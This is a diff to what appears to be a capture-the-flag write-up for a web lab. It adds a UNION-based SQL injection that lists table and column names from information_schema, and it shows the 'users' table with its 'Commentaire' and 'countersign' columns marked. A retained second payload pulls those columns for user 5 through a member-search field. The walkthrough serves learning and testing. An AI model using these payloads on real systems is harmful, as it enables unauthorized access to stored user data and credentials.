@@ -1,3 +1,13 @@
+Make this SQL Injection to find table structure : 
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+
+We are interested by this table :
+----------------------------------------------------------------------------------------------------------
+|                                                  users                                                 |
+----------------------------------------------------------------------------------------------------------
+|  user_id  |  first_name  |  last_name  |  town  |  country  |  planet  |  Commentaire  |  countersign  |
+---------------------------------------------------------------------------------^---------------^--------
+
 Make this SQL Injection in the "SEARCH MEMBER BY ID:" field :
 1 AND 1=2 UNION SELECT Commentaire, countersign FROM users WHERE user_id = 5
 
